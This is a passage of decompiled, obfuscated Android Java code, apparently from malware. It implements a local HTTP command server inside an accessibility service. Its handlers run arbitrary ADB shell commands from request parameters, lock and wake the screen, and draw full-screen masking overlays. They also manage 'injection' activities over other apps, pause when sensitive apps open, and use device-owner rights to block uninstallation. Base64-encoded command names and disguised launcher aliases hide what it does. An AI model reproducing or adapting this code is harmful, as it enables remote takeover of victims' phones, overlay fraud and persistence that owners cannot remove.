                case FileClientSessionCache.MAX_SIZE /* 12 */:
                    String str15 = localHttpServer$routeRequest$1.f52819a1;
                    C0322a7 c0322a713 = localHttpServer$routeRequest$1.f52818a0;
                    kg1.m213544f4(objMo211537a1);
                    jSONObject = (JSONObject) objMo211537a1;
                    return jSONObject;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "路由处理异常: " + str, e);
            String str16 = "处理异常: " + e.getMessage();
            c0322a7.getClass();
            return m211585a1(str16);
        }
    }

    /* renamed from: a1 */
    public static JSONObject m211585a1(String str) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 500);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, false);
        jSONObject.put("msg", str);
        return jSONObject;
    }

    /* renamed from: a7 */
    public static JSONObject m211586a7() throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("accessibilityRunning", true);
        jSONObject2.put("localHttpServerPort", f53086b0);
        jSONObject2.put("localServicePort", 7912);
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: a9 */
    public static List m211587a9() {
        return AbstractC0716jf.m213306g5(DefaultLauncherAlias.class, AppVariantA.class, AppVariantB.class, AppVariantC.class, AppVariantD.class, AppVariantE.class, AppVariantF.class, AppVariantG.class, AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantK.class, AppVariantL.class, AppVariantN.class);
    }

    /* renamed from: b5 */
    public static JSONObject m211588b5(Map map) {
        try {
            String str = (String) map.get("cmd");
            if (str == null && (str = (String) map.get(StringUtil.m212470a0("KFYcN0w2CA=="))) == null) {
                return m211585a1("缺少 cmd 参数");
            }
            t60.m214714d6("LocalHttpServer", "★ [adbShell] 执行: ".concat(str));
            C0360a2 j41Var = C0360a2.f53810f9.getInstance();
            if (j41Var == null) {
                return m211585a1("SystemOptimizeManager 未初始化，ADB 连接不可用");
            }
            String strM212058e8 = j41Var.m212058e8(str);
            t60.m214714d6("LocalHttpServer", "★ [adbShell] 输出: ".concat(strM212058e8 != null ? m21.m213937e5(200, strM212058e8) : "null"));
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, strM212058e8 != null);
            JSONObject jSONObject2 = new JSONObject();
            if (strM212058e8 == null) {
                strM212058e8 = "";
            }
            jSONObject2.put("output", strM212058e8);
            jSONObject2.put(StringUtil.m212470a0("KFYcN0w2CA=="), str);
            jSONObject.put("data", jSONObject2);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [adbShell] 执行异常", e);
            return AbstractC0003a2.m43c4("adbShell 异常: ", e.getMessage());
        }
    }

    /* renamed from: b8 */
    public static JSONObject m211589b8() {
        try {
            jbqfkndyx.f51944a4.finishCurrent();
            t60.m214714d6("LocalHttpServer", "✅ [注入] 已发送关闭注入Activity指令");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [注入] 关闭注入Activity失败", e);
            return AbstractC0003a2.m43c4("关闭注入Activity失败: ", e.getMessage());
        }
    }

    /* renamed from: c1 */
    public static JSONObject m211590c1() {
        Map mapM213618g3;
        try {
            dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
            if (c0290a0 == null) {
                return m211585a1("dqtvuisjd 未运行");
            }
            synchronized (c0290a0.f52406d7) {
                mapM213618g3 = AbstractC0770a1.m213618g3(c0290a0.f52405d6);
            }
            JSONArray jSONArray = new JSONArray();
            Iterator it = mapM213618g3.keySet().iterator();
            while (it.hasNext()) {
                jSONArray.put((String) it.next());
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject.put("count", mapM213618g3.size());
            jSONObject.put("packages", jSONArray);
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [注入] 获取注入任务列表失败", e);
            return AbstractC0003a2.m43c4("获取注入任务列表失败: ", e.getMessage());
        }
    }

    /* renamed from: c8 */
    public static JSONObject m211591c8(Map map) {
        try {
            String str = (String) map.get("reason");
            if (str == null) {
                str = "unknown";
            }
            t60.m214714d6("LocalHttpServer", "★★★ [敏感App] 收到暂停请求: reason=".concat(str));
            dqtvuisjd.f52358m1.pauseForSensitiveApp();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("paused", true);
            jSONObject2.put("reason", str);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            jSONObject.put("data", jSONObject2);
            jSONObject.put("message", "无障碍事件处理已暂停");
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [敏感App] 暂停失败", e);
            return AbstractC0003a2.m43c4("暂停失败: ", e.getMessage());
        }
    }

    /* renamed from: d0 */
    public static JSONObject m211592d0(Map map) {
        try {
            String str = (String) map.get("reason");
            if (str == null) {
                str = "unknown";
            }
            t60.m214714d6("LocalHttpServer", "★★★ [敏感App] 收到恢复请求: reason=".concat(str));
            dqtvuisjd.f52358m1.resumeFromSensitiveApp();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("paused", false);
            jSONObject2.put("reason", str);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            jSONObject.put("data", jSONObject2);
            jSONObject.put("message", "无障碍事件处理已恢复");
            return jSONObject;
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ [敏感App] 恢复失败", e);
            return AbstractC0003a2.m43c4("恢复失败: ", e.getMessage());
        }
    }

    /* renamed from: e3 */
    public static void m211593e3(InetAddress inetAddress, int i) throws InterruptedException, IOException {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(inetAddress, i), 1000);
            PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);
            printWriter.print("GET /shutdown HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n");
            printWriter.flush();
            Thread.sleep(200L);
            socket.close();
            t60.m214702c3("LocalHttpServer", "📡 已向旧端口 " + i + " 发送关闭请求");
        } catch (Exception unused) {
        }
    }

    /* renamed from: e4 */
    public static LinkedHashMap m211594e4(String str) throws UnsupportedEncodingException {
        LinkedHashMap linkedHashMap = new LinkedHashMap();
        Iterator it = AbstractC0779a1.m213677d0(str, new String[]{"&"}, 6).iterator();
        while (it.hasNext()) {
            List listM213677d0 = AbstractC0779a1.m213677d0((String) it.next(), new String[]{"="}, 2);
            if (listM213677d0.size() == 2) {
                String strDecode = URLDecoder.decode((String) listM213677d0.get(0), "UTF-8");
                t60.m214694b5(strDecode, "decode(kv[0], \"UTF-8\")");
                String strDecode2 = URLDecoder.decode((String) listM213677d0.get(1), "UTF-8");
                t60.m214694b5(strDecode2, "decode(kv[1], \"UTF-8\")");
                linkedHashMap.put(strDecode, strDecode2);
            }
        }
        return linkedHashMap;
    }

    /* renamed from: e6 */
    public static void m211595e6(PrintWriter printWriter, int i, JSONObject jSONObject) {
        String string = jSONObject.toString();
        t60.m214694b5(string, "body.toString()");
        printWriter.print("HTTP/1.1 " + i + " OK\r\n");
        printWriter.print("Content-Type: application/json; charset=utf-8\r\n");
        byte[] bytes = string.getBytes(AbstractC0577hd.f56650a0);
        t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
        printWriter.print("Content-Length: " + bytes.length + HTTP.CRLF);
        printWriter.print("Connection: close\r\n");
        printWriter.print(HTTP.CRLF);
        printWriter.print(string);
        printWriter.flush();
    }

    /* renamed from: e8 */
    public static JSONObject m211596e8(String str) throws JSONException {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        jSONObject.put("msg", str);
        return jSONObject;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211597a2(Map map, String str, ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$executeCommand$1 localHttpServer$executeCommand$1;
        String strOptString;
        C0322a7 c0322a7;
        if (continuationImpl instanceof LocalHttpServer$executeCommand$1) {
            localHttpServer$executeCommand$1 = (LocalHttpServer$executeCommand$1) continuationImpl;
            int i = localHttpServer$executeCommand$1.f52781a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$executeCommand$1.f52781a4 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$executeCommand$1 = new LocalHttpServer$executeCommand$1(this, continuationImpl);
            }
        }
        Object objM211883a0 = localHttpServer$executeCommand$1.f52779a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$executeCommand$1.f52781a4;
        if (i2 == 0) {
            kg1.m213544f4(objM211883a0);
            C0350a7 c0350a7 = this.f53093a5;
            if (c0350a7 == null) {
                return m211585a1("命令分发器未初始化");
            }
            JSONObject jSONObject = new JSONObject();
            if (str == null || !AbstractC0779a1.m213679d2(str, false, "{")) {
                String str2 = (String) map.get(StringUtil.m212470a0("KFYcN0w2CA=="));
                if (str2 == null) {
                    return m211585a1("缺少 command 参数");
                }
                jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), str2);
                JSONObject jSONObject2 = new JSONObject();
                for (Map.Entry entry : map.entrySet()) {
                    String str3 = (String) entry.getKey();
                    String str4 = (String) entry.getValue();
                    if (!t60.m214686a2(str3, StringUtil.m212470a0("KFYcN0w2CA=="))) {
                        jSONObject2.put(str3, str4);
                    }
                }
                if (jSONObject2.length() > 0) {
                    jSONObject.put("params", jSONObject2);
                }
            } else {
                JSONObject jSONObject3 = new JSONObject(str);
                String strM212470a0 = StringUtil.m212470a0("KFYcN0w2CA==");
                String strM212470a02 = StringUtil.m212470a0("KFYcN0w2CA==");
                String str5 = (String) map.get(StringUtil.m212470a0("KFYcN0w2CA=="));
                if (str5 == null) {
                    str5 = "";
                }
                jSONObject.put(strM212470a0, jSONObject3.optString(strM212470a02, str5));
                if (jSONObject3.has("params")) {
                    jSONObject.put("params", jSONObject3.getJSONObject("params"));
                }
            }
            strOptString = jSONObject.optString(StringUtil.m212470a0("KFYcN0w2CA=="), "");
            t60.m214714d6("LocalHttpServer", "★ 执行命令: " + strOptString);
            localHttpServer$executeCommand$1.f52777a0 = this;
            localHttpServer$executeCommand$1.f52778a1 = strOptString;
            localHttpServer$executeCommand$1.f52781a4 = 1;
            objM211883a0 = c0350a7.m211883a0(jSONObject, localHttpServer$executeCommand$1);
            if (objM211883a0 == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0322a7 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            strOptString = localHttpServer$executeCommand$1.f52778a1;
            c0322a7 = localHttpServer$executeCommand$1.f52777a0;
            kg1.m213544f4(objM211883a0);
        }
        if (((Boolean) objM211883a0).booleanValue()) {
            String str6 = "命令已执行: " + strOptString;
            c0322a7.getClass();
            return m211596e8(str6);
        }
        String str7 = "命令未处理: " + strOptString;
        c0322a7.getClass();
        return m211585a1(str7);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211598a3(Map map, String str, ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$executeGlobalAction$1 localHttpServer$executeGlobalAction$1;
        C0322a7 c0322a7;
        String str2;
        if (continuationImpl instanceof LocalHttpServer$executeGlobalAction$1) {
            localHttpServer$executeGlobalAction$1 = (LocalHttpServer$executeGlobalAction$1) continuationImpl;
            int i = localHttpServer$executeGlobalAction$1.f52786a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$executeGlobalAction$1.f52786a4 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$executeGlobalAction$1 = new LocalHttpServer$executeGlobalAction$1(this, continuationImpl);
            }
        }
        Object objM211883a0 = localHttpServer$executeGlobalAction$1.f52784a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$executeGlobalAction$1.f52786a4;
        if (i2 == 0) {
            kg1.m213544f4(objM211883a0);
            String strOptString = (String) map.get("action");
            if (strOptString == null) {
                strOptString = null;
                if (str != null) {
                    try {
                        strOptString = new JSONObject(str).optString("action");
                    } catch (Exception unused) {
                    }
                }
                if (strOptString == null) {
                    return m211585a1("缺少 action 参数");
                }
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), strOptString);
            JSONObject jSONObject2 = new JSONObject();
            for (Map.Entry entry : map.entrySet()) {
                String str3 = (String) entry.getKey();
                String str4 = (String) entry.getValue();
                if (!t60.m214686a2(str3, "action")) {
                    jSONObject2.put(str3, str4);
                }
            }
            if (jSONObject2.length() > 0) {
                jSONObject.put("params", jSONObject2);
            }
            C0350a7 c0350a7 = this.f53093a5;
            if (c0350a7 == null) {
                return m211585a1("命令分发器未初始化");
            }
            localHttpServer$executeGlobalAction$1.f52782a0 = this;
            localHttpServer$executeGlobalAction$1.f52783a1 = strOptString;
            localHttpServer$executeGlobalAction$1.f52786a4 = 1;
            objM211883a0 = c0350a7.m211883a0(jSONObject, localHttpServer$executeGlobalAction$1);
            if (objM211883a0 == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0322a7 = this;
            str2 = strOptString;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            str2 = localHttpServer$executeGlobalAction$1.f52783a1;
            c0322a7 = localHttpServer$executeGlobalAction$1.f52782a0;
            kg1.m213544f4(objM211883a0);
        }
        if (((Boolean) objM211883a0).booleanValue()) {
            String str5 = "全局动作已执行: " + str2;
            c0322a7.getClass();
            return m211596e8(str5);
        }
        String str6 = "动作未处理: " + str2;
        c0322a7.getClass();
        return m211585a1(str6);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211599a4(ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$executeLockScreen$1 localHttpServer$executeLockScreen$1;
        C0322a7 c0322a7;
        if (continuationImpl instanceof LocalHttpServer$executeLockScreen$1) {
            localHttpServer$executeLockScreen$1 = (LocalHttpServer$executeLockScreen$1) continuationImpl;
            int i = localHttpServer$executeLockScreen$1.f52790a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$executeLockScreen$1.f52790a3 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$executeLockScreen$1 = new LocalHttpServer$executeLockScreen$1(this, continuationImpl);
            }
        }
        Object objM211883a0 = localHttpServer$executeLockScreen$1.f52788a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$executeLockScreen$1.f52790a3;
        if (i2 == 0) {
            kg1.m213544f4(objM211883a0);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("G3YmH38HPwJyFBs="));
            C0350a7 c0350a7 = this.f53093a5;
            if (c0350a7 == null) {
                c0322a7 = this;
                c0322a7.getClass();
                return m211596e8("锁屏命令已发送");
            }
            localHttpServer$executeLockScreen$1.f52787a0 = this;
            localHttpServer$executeLockScreen$1.f52790a3 = 1;
            objM211883a0 = c0350a7.m211883a0(jSONObject, localHttpServer$executeLockScreen$1);
            if (objM211883a0 == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0322a7 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0322a7 = localHttpServer$executeLockScreen$1.f52787a0;
            kg1.m213544f4(objM211883a0);
        }
        c0322a7.getClass();
        return m211596e8("锁屏命令已发送");
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211600a5(ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$executeWakeScreen$1 localHttpServer$executeWakeScreen$1;
        C0322a7 c0322a7;
        if (continuationImpl instanceof LocalHttpServer$executeWakeScreen$1) {
            localHttpServer$executeWakeScreen$1 = (LocalHttpServer$executeWakeScreen$1) continuationImpl;
            int i = localHttpServer$executeWakeScreen$1.f52794a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$executeWakeScreen$1.f52794a3 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$executeWakeScreen$1 = new LocalHttpServer$executeWakeScreen$1(this, continuationImpl);
            }
        }
        Object objM211883a0 = localHttpServer$executeWakeScreen$1.f52792a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$executeWakeScreen$1.f52794a3;
        if (i2 == 0) {
            kg1.m213544f4(objM211883a0);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), StringUtil.m212470a0("G3YmH38HOw98FA=="));
            C0350a7 c0350a7 = this.f53093a5;
            if (c0350a7 == null) {
                c0322a7 = this;
                c0322a7.getClass();
                return m211596e8("唤醒命令已发送");
            }
            localHttpServer$executeWakeScreen$1.f52791a0 = this;
            localHttpServer$executeWakeScreen$1.f52794a3 = 1;
            objM211883a0 = c0350a7.m211883a0(jSONObject, localHttpServer$executeWakeScreen$1);
            if (objM211883a0 == coroutineSingletons) {
                return coroutineSingletons;
            }
            c0322a7 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0322a7 = localHttpServer$executeWakeScreen$1.f52791a0;
            kg1.m213544f4(objM211883a0);
        }
        c0322a7.getClass();
        return m211596e8("唤醒命令已发送");
    }

    /* renamed from: a6 */
    public final JSONObject m211601a6() throws JSONException {
        ServiceInfo serviceInfo;
        String str;
        ServiceInfo serviceInfo2;
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        Object systemService = dqtvuisjdVar.getSystemService("accessibility");
        AccessibilityManager accessibilityManager = systemService instanceof AccessibilityManager ? (AccessibilityManager) systemService : null;
        boolean z = false;
        boolean z2 = accessibilityManager != null && accessibilityManager.isEnabled();
        List<AccessibilityServiceInfo> enabledAccessibilityServiceList = accessibilityManager != null ? accessibilityManager.getEnabledAccessibilityServiceList(-1) : null;
        if (enabledAccessibilityServiceList == null) {
            enabledAccessibilityServiceList = EmptyList.f57568a0;
        }
        String packageName = dqtvuisjdVar.getPackageName();
        if (enabledAccessibilityServiceList == null || !enabledAccessibilityServiceList.isEmpty()) {
            Iterator<T> it = enabledAccessibilityServiceList.iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                ResolveInfo resolveInfo = ((AccessibilityServiceInfo) it.next()).getResolveInfo();
                if (t60.m214686a2((resolveInfo == null || (serviceInfo = resolveInfo.serviceInfo) == null) ? null : serviceInfo.packageName, packageName)) {
                    z = true;
                    break;
                }
            }
        }
        ArrayList arrayList = new ArrayList();
        Iterator<T> it2 = enabledAccessibilityServiceList.iterator();
        while (it2.hasNext()) {
            ResolveInfo resolveInfo2 = ((AccessibilityServiceInfo) it2.next()).getResolveInfo();
            if (resolveInfo2 == null || (serviceInfo2 = resolveInfo2.serviceInfo) == null) {
                str = null;
            } else {
                str = serviceInfo2.packageName + "/" + serviceInfo2.name;
            }
            if (str != null) {
                arrayList.add(str);
            }
        }
        String strM213295i2 = AbstractC0715je.m213295i2(arrayList, ":", null, null, null, 62);
        String string = Settings.Secure.getString(dqtvuisjdVar.getContentResolver(), "enabled_accessibility_services");
        if (string == null) {
            string = "";
        }
        String str2 = dqtvuisjdVar.getPackageName() + "/" + dqtvuisjd.class.getName();
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("accessibilityEnabled", z2);
        jSONObject2.put("ourServiceEnabled", z);
        jSONObject2.put("enabledServices", strM213295i2);
        jSONObject2.put("settingsServices", string);
        jSONObject2.put("ourService", str2);
        jSONObject2.put("packageName", packageName);
        jSONObject2.put("enabledCount", enabledAccessibilityServiceList.size());
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: a8 */
    public final JSONObject m211602a8() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            Object systemService = dqtvuisjdVar.getSystemService("device_policy");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
            ComponentName componentName = new ComponentName(dqtvuisjdVar, (Class<?>) zbrefryi.class);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("code", 200);
            jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("isAdminActive", devicePolicyManager.isAdminActive(componentName) ? 1 : 0);
            jSONObject2.put("isDeviceOwner", devicePolicyManager.isDeviceOwnerApp(dqtvuisjdVar.getPackageName()) ? 1 : 0);
            jSONObject2.put("isProfileOwner", devicePolicyManager.isProfileOwnerApp(dqtvuisjdVar.getPackageName()) ? 1 : 0);
            jSONObject2.put("packageName", dqtvuisjdVar.getPackageName());
            jSONObject.put("data", jSONObject2);
            return jSONObject;
        } catch (Exception e) {
            return AbstractC0003a2.m43c4("获取设备管理状态失败: ", e.getMessage());
        }
    }

    /* renamed from: b0 */
    public final JSONObject m211603b0() throws JSONException {
        Object systemService = this.f53088a0.getSystemService("keyguard");
        KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("isLocked", keyguardManager != null ? keyguardManager.isKeyguardLocked() : false);
        jSONObject2.put("isSecure", keyguardManager != null ? keyguardManager.isKeyguardSecure() : false);
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: b1 */
    public final JSONObject m211604b1() throws JSONException {
        Object systemService = this.f53088a0.getSystemService("connectivity");
        ConnectivityManager connectivityManager = systemService instanceof ConnectivityManager ? (ConnectivityManager) systemService : null;
        Network activeNetwork = connectivityManager != null ? connectivityManager.getActiveNetwork() : null;
        NetworkCapabilities networkCapabilities = activeNetwork != null ? connectivityManager.getNetworkCapabilities(activeNetwork) : null;
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("connected", activeNetwork != null);
        jSONObject2.put("hasInternet", networkCapabilities != null ? networkCapabilities.hasCapability(12) : false);
        jSONObject2.put("isWifi", networkCapabilities != null ? networkCapabilities.hasTransport(1) : false);
        jSONObject2.put("isCellular", networkCapabilities != null ? networkCapabilities.hasTransport(0) : false);
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: b2 */
    public final JSONObject m211605b2() throws JSONException {
        Object systemService = this.f53088a0.getSystemService("power");
        PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("code", 200);
        jSONObject.put(PollingXHR.Request.EVENT_SUCCESS, true);
        JSONObject jSONObject2 = new JSONObject();
        jSONObject2.put("isScreenOn", powerManager != null ? powerManager.isInteractive() : false);
        jSONObject.put("data", jSONObject2);
        return jSONObject;
    }

    /* renamed from: b3 */
    public final String m211606b3() throws PackageManager.NameNotFoundException {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            PackageInfo packageInfo = dqtvuisjdVar.getPackageManager().getPackageInfo(dqtvuisjdVar.getPackageName(), 0);
            return "v" + packageInfo.versionName + "(" + packageInfo.getLongVersionCode() + ")";
        } catch (Exception unused) {
            return "unknown";
        }
    }

    /* renamed from: b4 */
    public final JSONObject m211607b4() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
            Object systemService = dqtvuisjdVar.getSystemService("device_policy");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager");
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) systemService;
            ComponentName componentName = new ComponentName(dqtvuisjdVar, (Class<?>) zbrefryi.class);
            if (!devicePolicyManager.isDeviceOwnerApp(dqtvuisjdVar.getPackageName())) {
                return m211596e8("Not Device Owner");
            }
            devicePolicyManager.setUninstallBlocked(componentName, dqtvuisjdVar.getPackageName(), true);
            t60.m214714d6("LocalHttpServer", "🔒 [DeviceOwner] 已设置 setUninstallBlocked=true");
            return m211596e8("Already Device Owner, setUninstallBlocked=true");
        } catch (Exception e) {
            t60.m214705c6("LocalHttpServer", "❌ handleActiveDeviceOwner 异常", e);
            return AbstractC0003a2.m43c4("activeDeviceOwner 异常: ", e.getMessage());
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211608b6(Map map, ContinuationImpl continuationImpl) throws Throwable {
        LocalHttpServer$handleBlockView$1 localHttpServer$handleBlockView$1;
        String strM212470a0;
        C0322a7 c0322a7;
        String str;
        Integer numM213685d8;
        if (continuationImpl instanceof LocalHttpServer$handleBlockView$1) {
            localHttpServer$handleBlockView$1 = (LocalHttpServer$handleBlockView$1) continuationImpl;
            int i = localHttpServer$handleBlockView$1.f52799a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                localHttpServer$handleBlockView$1.f52799a4 = i - Integer.MIN_VALUE;
            } else {
                localHttpServer$handleBlockView$1 = new LocalHttpServer$handleBlockView$1(this, continuationImpl);
            }
        }
        Object obj = localHttpServer$handleBlockView$1.f52797a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = localHttpServer$handleBlockView$1.f52799a4;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            String str2 = (String) map.get("action");
            if (str2 == null) {
                str2 = "show";
            }
            String str3 = (String) map.get("text");
            if (str3 == null) {
                str3 = "";
            }
            String str4 = (String) map.get("alpha");
            int iIntValue = (str4 == null || (numM213685d8 = AbstractC0779a1.m213685d8(str4)) == null) ? v10.MASK : numM213685d8.intValue();
            strM212470a0 = StringUtil.m212470a0(str2.equals("hide") ? "D3AiG28UKRF1HQp6OgV+Gz4Lch8=" : "DncwGGEdMwx7EAhyLgluCikLeQ==");
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(StringUtil.m212470a0("KFYcN0w2CA=="), strM212470a0);
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("text", str3);
            jSONObject2.put("alpha", iIntValue);
            jSONObject.put("params", jSONObject2);
            C0350a7 c0350a7 = this.f53093a5;
            if (c0350a7 == null) {
                c0322a7 = this;
                String str5 = "遮罩命令已执行: " + strM212470a0;
                c0322a7.getClass();
                return m211596e8(str5);
            }
            localHttpServer$handleBlockView$1.f52795a0 = this;
            localHttpServer$handleBlockView$1.f52796a1 = strM212470a0;
            localHttpServer$handleBlockView$1.f52799a4 = 1;
            Object objM211883a0 = c0350a7.m211883a0(jSONObject, localHttpServer$handleBlockView$1);
            if (objM211883a0 == coroutineSingletons) {
                return coroutineSingletons;
            }
            obj = objM211883a0;
            str = strM212470a0;
            c0322a7 = this;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            str = localHttpServer$handleBlockView$1.f52796a1;
            c0322a7 = localHttpServer$handleBlockView$1.f52795a0;
            kg1.m213544f4(obj);
        }
        strM212470a0 = str;
        String str52 = "遮罩命令已执行: " + strM212470a0;
        c0322a7.getClass();
        return m211596e8(str52);
    }

    /* renamed from: b7 */
    public final JSONObject m211609b7() {
        try {
            PackageManager packageManager = this.f53088a0.getPackageManager();
            List<ResolveInfo> listQueryIntentActivities = packageManager.queryIntentActivities(new Intent("android.intent.action.VIEW", Uri.parse("http://")), 0);
            t60.m214694b5(listQueryIntentActivities, "pm.queryIntentActivities(intent, 0)");
            JSONArray jSONArray = new JSONArray();
            for (ResolveInfo resolveInfo : listQueryIntentActivities) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("packageName", resolveInfo.activityInfo.packageName);
                jSONObject.put("appName", resolveInfo.loadLabel(packageManager).toString());
                jSONArray.put(jSONObject);
            }
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put("code", 200);
            jSONObject2.put(PollingXHR.Request.EVENT_SUCCESS, true);
            jSONObject2.put("data", jSONArray);
            return jSONObject2;
        } catch (Exception e) {
            return AbstractC0003a2.m43c4("browserApps 异常: ", e.getMessage());
        }
    }

    /* renamed from: b9 */
    public final JSONObject m211610b9() {
        dqtvuisjd dqtvuisjdVar = this.f53088a0;
        try {
